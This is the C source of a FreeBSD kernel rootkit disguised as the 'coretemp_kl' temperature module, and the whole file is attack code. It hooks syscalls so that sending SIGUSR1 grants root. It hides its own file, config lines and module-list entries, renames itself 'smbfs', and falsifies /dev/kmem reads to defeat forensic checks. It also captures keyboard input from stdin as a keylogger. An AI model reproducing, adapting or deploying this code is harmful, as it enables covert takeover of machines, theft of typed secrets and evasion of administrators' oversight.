/* coretemp_kl - escalation, concealment and kernel-memory masking. */
#include <sys/param.h>
#include <sys/kernel.h>
#include <sys/module.h>
#include <sys/systm.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/syscall.h>
#include <sys/dirent.h>
#include <sys/linker.h>
#include <sys/malloc.h>
#include <sys/mutex.h>
#include <sys/proc.h>
#include <sys/ucred.h>
#include <sys/signal.h>
#include <sys/file.h>
#include <sys/filedesc.h>
#include <sys/capsicum.h>
#include <sys/conf.h>
#include <sys/queue.h>

/* sys/vnode.h needs generated vnode_if.h; declare it locally. */
struct vnode;
int vn_fullpath(struct vnode *vp, char **retbuf, char **freebuf);

#define RK_KMOD_NAME	"coretemp_kl"
#define RK_KO_NAME	"coretemp_kl.ko"
#define RK_MAGIC_SIG	30		/* SIGUSR1 */
#define RK_KMEM_MAX	262144		/* cap for buffer rewriting */
#define RK_KEYLOG_SIZE	4096
#define RK_MAX_MASKS	32

/* ---------------------------------------------------------------- shadows */

static sy_call_t *rk_kill_orig;
static sy_call_t *rk_getdirentries_orig;
static sy_call_t *rk_open_orig;
static sy_call_t *rk_openat_orig;
static sy_call_t *rk_fstatat_orig;
static sy_call_t *rk_access_orig;
static sy_call_t *rk_unlink_orig;
static sy_call_t *rk_unlinkat_orig;
static sy_call_t *rk_rename_orig;
static sy_call_t *rk_renameat_orig;
static sy_call_t *rk_readlink_orig;
static sy_call_t *rk_readlinkat_orig;
static sy_call_t *rk_truncate_orig;
static sy_call_t *rk_chmod_orig;
static sy_call_t *rk_fchmodat_orig;
static sy_call_t *rk_chflags_orig;
static sy_call_t *rk_chflagsat_orig;
static sy_call_t *rk_read_orig;
static sy_call_t *rk_pread_orig;

/* Hook addresses and their originals, for kmem masking. */
static uint64_t rk_mask_from[RK_MAX_MASKS];
static uint64_t rk_mask_to[RK_MAX_MASKS];
static int rk_mask_count;

/* --------------------------------------------------------------- keylogger */

static char rk_klog[RK_KEYLOG_SIZE];
static size_t rk_klog_len;
static struct mtx rk_klog_mtx;

/* ---------------------------------------------------------------- helpers */

static void
rk_mask_add(uintptr_t hook, uintptr_t orig)
{
	if (rk_mask_count >= RK_MAX_MASKS)
		return;
	rk_mask_from[rk_mask_count] = (uint64_t)hook;
	rk_mask_to[rk_mask_count] = (uint64_t)orig;
	rk_mask_count++;
}

static boolean_t
rk_name_hidden(const char *name, size_t len)
{
	const char *hide = RK_KO_NAME;
	size_t hlen = strlen(hide);

	return (len == hlen && memcmp(name, hide, len) == 0);
}

static boolean_t
rk_path_hidden(const char *path, size_t len)
{
	const char *base = path;
	size_t i;

	for (i = 0; i < len; i++) {
		if (path[i] == '/')
			base = path + i + 1;
	}

	return (rk_name_hidden(base, len - (size_t)(base - path)));
}

/* TRUE if the user path names the hidden file. */
static boolean_t
rk_user_path_hidden(const char *upath)
{
	char buf[PATH_MAX];
	size_t done;

	if (upath == NULL)
		return (FALSE);
	if (copyinstr(upath, buf, sizeof(buf), &done) != 0)
		return (FALSE);
	if (done != 0)
		done--;		/* drop NUL */
	return (rk_path_hidden(buf, done));
}

/* Rewrite our sy_call pointers inside a buffer returned from /dev/kmem. */
static void
rk_mask_user_buf(void *ubuf, size_t len)
{
	char *buf;
	size_t off;
	int i;
	boolean_t changed;

	if (len == 0 || len > RK_KMEM_MAX || rk_mask_count == 0)
		return;

	buf = malloc(len, M_TEMP, M_WAITOK);
	if (copyin(ubuf, buf, len) != 0) {
		free(buf, M_TEMP);
		return;
	}

	changed = FALSE;
	for (off = 0; off + sizeof(uint64_t) <= len; off++) {
		uint64_t val;

		memcpy(&val, buf + off, sizeof(val));
		for (i = 0; i < rk_mask_count; i++) {
			if (val == rk_mask_from[i]) {
				memcpy(buf + off, &rk_mask_to[i],
				    sizeof(uint64_t));
				changed = TRUE;
				break;
			}
		}
	}

	if (changed)
		(void)copyout(buf, ubuf, len);
	free(buf, M_TEMP);
}

/* Drop lines mentioning the module from rc/loader config. */
static size_t
rk_filter_lines(char *buf, size_t len)
{
	size_t r = 0, w = 0;

	while (r < len) {
		size_t start = r, end;
		boolean_t hide = FALSE;

		while (r < len && buf[r] != '\n')
			r++;
		if (r < len)
			r++;
		end = r;
		for (size_t i = start; i + strlen(RK_KO_NAME) <= end; i++) {
			if (memcmp(buf + i, RK_KO_NAME,
			    strlen(RK_KO_NAME)) == 0) {
				hide = TRUE;
				break;
			}
		}
		if (!hide) {
			if (w != start)
				memmove(buf + w, buf + start, end - start);
			w += end - start;
		}
	}
	return (w);
}

static boolean_t
rk_conf_path(const char *path)
{
	return (strcmp(path, "/etc/rc.conf") == 0 ||
	    strcmp(path, "/etc/rc.conf.local") == 0 ||
	    strcmp(path, "/boot/loader.conf") == 0 ||
	    strcmp(path, "/boot/loader.conf.local") == 0);
}

/* --------------------------------------------------------------- keylogger */

static void
rk_keylog_capture(const void *ubuf, size_t len)
{
	char buf[128];
	size_t i, n;

	if (len > sizeof(buf))
		len = sizeof(buf);
	if (copyin(ubuf, buf, len) != 0)
		return;

	mtx_lock(&rk_klog_mtx);
	for (i = 0; i < len && rk_klog_len < sizeof(rk_klog); i++) {
		unsigned char c = (unsigned char)buf[i];

		if ((c >= 0x20 && c < 0x7f) || c == '\n' || c == '\t' ||
		    c == '\b' || c == '\r')
			rk_klog[rk_klog_len++] = (char)c;
	}
	n = rk_klog_len;
	mtx_unlock(&rk_klog_mtx);
	(void)n;
}

/* ---------------------------------------------------------- escalation */

static void
rk_elevate(struct thread *td)
{
	struct proc *p = td->td_proc;
	struct ucred *newcred, *oldcred;
	gid_t gid0 = 0;

	newcred = crget();
	PROC_LOCK(p);
	oldcred = crcopysafe(p, newcred);
	newcred->cr_uid = 0;
	newcred->cr_ruid = 0;
	newcred->cr_svuid = 0;
	newcred->cr_rgid = 0;
	newcred->cr_svgid = 0;
	crsetgroups(newcred, 1, &gid0);
	proc_set_cred(p, newcred);
	PROC_UNLOCK(p);
	crfree(oldcred);
}

static int
rk_kill(struct thread *td, void *uap)
{
	struct kill_args *u = uap;

	if (u->signum == RK_MAGIC_SIG && td->td_ucred != NULL &&
	    td->td_ucred->cr_uid != 0) {
		rk_elevate(td);
		return (0);
	}

	return ((*rk_kill_orig)(td, uap));
}

/* ------------------------------------------------------------- path hooks */

static int
rk_open(struct thread *td, void *uap)
{
	struct open_args *u = uap;

	if (rk_user_path_hidden(u->path))
		return (ENOENT);
	return ((*rk_open_orig)(td, uap));
}

static int
rk_openat(struct thread *td, void *uap)
{
	struct openat_args *u = uap;

	if (rk_user_path_hidden(u->path))
		return (ENOENT);
	return ((*rk_openat_orig)(td, uap));
}

static int
rk_fstatat(struct thread *td, void *uap)
{
	struct fstatat_args *u = uap;

	if (rk_user_path_hidden(u->path))
		return (ENOENT);
	return ((*rk_fstatat_orig)(td, uap));
}

static int
rk_access(struct thread *td, void *uap)
{
	struct access_args *u = uap;

	if (rk_user_path_hidden(u->path))
		return (ENOENT);
	return ((*rk_access_orig)(td, uap));
}

static int
rk_unlink(struct thread *td, void *uap)
{
	struct unlink_args *u = uap;

	if (rk_user_path_hidden(u->path))
		return (ENOENT);
	return ((*rk_unlink_orig)(td, uap));
}

static int
rk_unlinkat(struct thread *td, void *uap)
{
	struct unlinkat_args *u = uap;

	if (rk_user_path_hidden(u->path))
		return (ENOENT);
	return ((*rk_unlinkat_orig)(td, uap));
}

static int
rk_rename(struct thread *td, void *uap)
{
	struct rename_args *u = uap;

	if (rk_user_path_hidden(u->from) || rk_user_path_hidden(u->to))
		return (ENOENT);
	return ((*rk_rename_orig)(td, uap));
}

static int
rk_renameat(struct thread *td, void *uap)
{
	struct renameat_args *u = uap;

	if (rk_user_path_hidden(u->old) || rk_user_path_hidden(u->new))
		return (ENOENT);
	return ((*rk_renameat_orig)(td, uap));
}

static int
rk_readlink(struct thread *td, void *uap)
{
	struct readlink_args *u = uap;

	if (rk_user_path_hidden(u->path))
		return (ENOENT);
	return ((*rk_readlink_orig)(td, uap));
}

static int
rk_readlinkat(struct thread *td, void *uap)
{
	struct readlinkat_args *u = uap;

	if (rk_user_path_hidden(u->path))
		return (ENOENT);
	return ((*rk_readlinkat_orig)(td, uap));
}

static int
rk_truncate(struct thread *td, void *uap)
{
	struct truncate_args *u = uap;

	if (rk_user_path_hidden(u->path))
		return (ENOENT);
	return ((*rk_truncate_orig)(td, uap));
}

static int
rk_chmod(struct thread *td, void *uap)
{
	struct chmod_args *u = uap;

	if (rk_user_path_hidden(u->path))
		return (ENOENT);
	return ((*rk_chmod_orig)(td, uap));
}

static int
rk_fchmodat(struct thread *td, void *uap)
{
	struct fchmodat_args *u = uap;

	if (rk_user_path_hidden(u->path))
		return (ENOENT);
	return ((*rk_fchmodat_orig)(td, uap));
}

static int
rk_chflags(struct thread *td, void *uap)
{
	struct chflags_args *u = uap;

	if (rk_user_path_hidden(u->path))
		return (ENOENT);
	return ((*rk_chflags_orig)(td, uap));
}

static int
rk_chflagsat(struct thread *td, void *uap)
{
	struct chflagsat_args *u = uap;

	if (rk_user_path_hidden(u->path))
		return (ENOENT);
	return ((*rk_chflagsat_orig)(td, uap));
}

/* ------------------------------------------------------- directory filter */

static int
rk_getdirentries(struct thread *td, void *uap)
{
	struct getdirentries_args *u = uap;
	struct dirent *d;
	char *buf;
	size_t cnt, off, out;
	int error, tries;

	for (tries = 0; tries < 32; tries++) {
		error = (*rk_getdirentries_orig)(td, uap);
		if (error != 0)
			return (error);

		cnt = (size_t)td->td_retval[0];
		if (cnt == 0)
			return (0);
		if (cnt > 1 << 20)
			/* Too large to filter. */
			return (0);

		buf = malloc(cnt, M_TEMP, M_WAITOK);
		if (copyin(u->buf, buf, cnt) != 0) {
			free(buf, M_TEMP);
			return (0);
		}

		out = 0;
		for (off = 0; off < cnt;) {
			d = (struct dirent *)(buf + off);
			if (d->d_reclen == 0 || off + d->d_reclen > cnt)
				break;
			if (!rk_name_hidden(d->d_name, d->d_namlen)) {
				if (out != off)
					memmove(buf + out, buf + off,
					    d->d_reclen);
				out += d->d_reclen;
			}
			off += d->d_reclen;
		}

		if (out != 0) {
			if (copyout(buf, u->buf, out) != 0)
				out = 0;
			free(buf, M_TEMP);
			td->td_retval[0] = out;
			return (0);
		}
		free(buf, M_TEMP);
	}

	td->td_retval[0] = 0;
	return (0);
}

/* ------------------------------------------------------- read interception */

/* Mask kmem reads, redact config lines, capture tty input. */
static void
rk_read_post(struct thread *td, int fd, void *ubuf, ssize_t nread)
{
	struct file *fp;
	cap_rights_t rights;
	char *path = NULL, *freepath = NULL;
	boolean_t is_kmem = FALSE;

	if (nread <= 0)
		return;

	cap_rights_init(&rights, CAP_READ);
	if (fget(td, fd, &rights, &fp) != 0)
		return;

	if (fp->f_type == DTYPE_VNODE && fp->f_vnode != NULL &&
	    vn_fullpath(fp->f_vnode, &path, &freepath) == 0) {
		is_kmem = (strcmp(path, "/dev/kmem") == 0 ||
		    strcmp(path, "/dev/mem") == 0);
		if (is_kmem) {
			rk_mask_user_buf(ubuf, (size_t)nread);
		} else if (rk_conf_path(path)) {
			char *buf;
			size_t len = (size_t)nread, out;

			buf = malloc(len + 1, M_TEMP, M_WAITOK);
			if (copyin(ubuf, buf, len) == 0) {
				out = rk_filter_lines(buf, len);
				if (out != len) {
					if (copyout(buf, ubuf, out) == 0)
						td->td_retval[0] = out;
				}
			}
			free(buf, M_TEMP);
		} else if (fd == 0 && fp->f_type == DTYPE_VNODE) {
			rk_keylog_capture(ubuf, (size_t)nread);
		}
	}

	/* retbuf points into freebuf. */
	if (freepath != NULL)
		free(freepath, M_TEMP);
	fdrop(fp, td);
}

static int
rk_read(struct thread *td, void *uap)
{
	struct read_args *u = uap;
	int error;

	error = (*rk_read_orig)(td, uap);
	if (error == 0)
		rk_read_post(td, u->fd, u->buf, td->td_retval[0]);
	return (error);
}

static int
rk_pread(struct thread *td, void *uap)
{
	struct pread_args *u = uap;
	int error;

	error = (*rk_pread_orig)(td, uap);
	if (error == 0)
		rk_read_post(td, u->fd, u->buf, td->td_retval[0]);
	return (error);
}

/* ------------------------------------------------------------- concealment */

/* Kernel-private struct module layout (kern_module.c). */
struct rk_module {
	TAILQ_ENTRY(rk_module) link;
	TAILQ_ENTRY(rk_module) flink;
	struct linker_file *file;
	int refs;
	int id;
	char *name;
};

struct rk_modhead {
	struct rk_module *tqh_first;
	struct rk_module **tqh_last;
};

struct rk_lfhead {
	linker_file_t tqh_first;
	linker_file_t *tqh_last;
};

static void *
rk_ksym(const char *name)
{
	return (linker_file_lookup_symbol(linker_kernel_file, name, 0));
}

static void
rk_hide_self(module_t mod)
{
	struct rk_modhead *modhead;
	struct rk_lfhead *lfhead;
	struct rk_module *rm = (struct rk_module *)mod;
	linker_file_t lf;
	int *nextid, *nextfileid;
	char *name;
	size_t namelen;

	modhead = rk_ksym("modules");
	lfhead = rk_ksym("linker_files");
	nextid = rk_ksym("nextid");
	nextfileid = rk_ksym("next_file_id");

	lf = module_file(mod);
	if (lf == NULL)
		return;

	/* Rename before hiding so name lookups fail. */
	name = rm->name;
	if (name != NULL) {
		namelen = strlen(name) + 1;
		if (namelen >= sizeof("smbfs"))
			strlcpy(name, "smbfs", namelen);
	}

	if (modhead != NULL) {
		MOD_XLOCK;
		TAILQ_REMOVE(modhead, rm, link);
		if (nextid != NULL)
			(*nextid)--;
		MOD_XUNLOCK;
	}

	if (lfhead != NULL) {
		TAILQ_REMOVE(lfhead, lf, link);
		if (nextfileid != NULL)
			(*nextfileid)--;
	}
}

/* ------------------------------------------------------------ module glue */

#define RK_SWAP(sysname, fn) do {					\
	rk_##fn##_orig = sysent[SYS_##sysname].sy_call;			\
	sysent[SYS_##sysname].sy_call = rk_##fn;			\
	rk_mask_add((uintptr_t)rk_##fn,					\
	    (uintptr_t)rk_##fn##_orig);					\
} while (0)

static int
rk_modevent(module_t mod, int type, void *arg)
{
	(void)arg;

	switch (type) {
	case MOD_LOAD:
		rk_mask_count = 0;
		mtx_init(&rk_klog_mtx, "klog", NULL, MTX_DEF);

		RK_SWAP(kill, kill);
		RK_SWAP(getdirentries, getdirentries);
		RK_SWAP(open, open);
		RK_SWAP(openat, openat);
		RK_SWAP(fstatat, fstatat);
		RK_SWAP(access, access);
		RK_SWAP(unlink, unlink);
		RK_SWAP(unlinkat, unlinkat);
		RK_SWAP(rename, rename);
		RK_SWAP(renameat, renameat);
		RK_SWAP(readlink, readlink);
		RK_SWAP(readlinkat, readlinkat);
		RK_SWAP(truncate, truncate);
		RK_SWAP(chmod, chmod);
		RK_SWAP(fchmodat, fchmodat);
		RK_SWAP(chflags, chflags);
		RK_SWAP(chflagsat, chflagsat);
		RK_SWAP(read, read);
		RK_SWAP(pread, pread);

#ifndef RK_NO_HIDE
		rk_hide_self(mod);
#endif
		break;

	case MOD_UNLOAD:
		/* Unwind path for the debug build. */
		sysent[SYS_kill].sy_call = rk_kill_orig;
		sysent[SYS_getdirentries].sy_call = rk_getdirentries_orig;
		sysent[SYS_open].sy_call = rk_open_orig;
		sysent[SYS_openat].sy_call = rk_openat_orig;
		sysent[SYS_fstatat].sy_call = rk_fstatat_orig;
		sysent[SYS_access].sy_call = rk_access_orig;
		sysent[SYS_unlink].sy_call = rk_unlink_orig;
		sysent[SYS_unlinkat].sy_call = rk_unlinkat_orig;
		sysent[SYS_rename].sy_call = rk_rename_orig;
		sysent[SYS_renameat].sy_call = rk_renameat_orig;
		sysent[SYS_readlink].sy_call = rk_readlink_orig;
		sysent[SYS_readlinkat].sy_call = rk_readlinkat_orig;
		sysent[SYS_truncate].sy_call = rk_truncate_orig;
		sysent[SYS_chmod].sy_call = rk_chmod_orig;
		sysent[SYS_fchmodat].sy_call = rk_fchmodat_orig;
		sysent[SYS_chflags].sy_call = rk_chflags_orig;
		sysent[SYS_chflagsat].sy_call = rk_chflagsat_orig;
		sysent[SYS_read].sy_call = rk_read_orig;
		sysent[SYS_pread].sy_call = rk_pread_orig;
		mtx_destroy(&rk_klog_mtx);
		break;

	default:
		break;
	}

	return (0);
}

static moduledata_t rk_mod = {
	RK_KMOD_NAME,
	rk_modevent,
	NULL
};

MODULE_VERSION(coretemp_kl, 1);
DECLARE_MODULE(coretemp_kl, rk_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
